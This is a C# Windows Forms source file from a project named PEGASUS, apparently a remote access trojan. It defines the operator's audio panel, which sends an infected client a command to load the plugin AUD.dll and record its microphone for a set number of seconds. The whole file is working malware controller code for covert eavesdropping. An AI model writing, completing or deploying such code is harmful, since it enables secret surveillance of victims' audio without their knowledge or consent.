using PEGASUS.Cryptografhsh;
using PEGASUS.Diadyktio;
using PEGASUS.Metafora_Dedomenon;
using System;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace PEGASUS.Design
{
    public partial class FormAudio : Form
    {
        private SoundPlayer SP = new SoundPlayer();

        public FormAudio()
        {
            InitializeComponent();
            MinimizeBox = false;
            MaximizeBox = false;
        }

        public PEGALISIUS F { get; set; }
        internal Clients ParentClient { get; set; }
        internal Clients Client { get; set; }

        public byte[] BytesToPlay { get; set; }

        //Start or stop audio recording


        //Start or stop audio playback

        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!Client.TcpClient.Connected || !ParentClient.TcpClient.Connected) Close();
            }
            catch
            {
                Close();
            }
        }

        [DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
        private static extern void ReleaseCapture();

        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
        private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

        private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, 0x112, 0xf012, 0);
        }

        private void guna2PictureBox1_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void btnStartStopRecord_Click_1(object sender, EventArgs e)
        {
            if (textBox1.Text != null)
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "audio";
                packet.ForcePathObject("Second").AsString = textBox1.Text;

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\AUD.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                Thread.Sleep(100);
                btnStartStopRecord.Text = "Wait...";
                btnStartStopRecord.Enabled = false;
            }
            else
            {
                MessageBox.Show("Input seconds to record.");
            }
        }
    }
}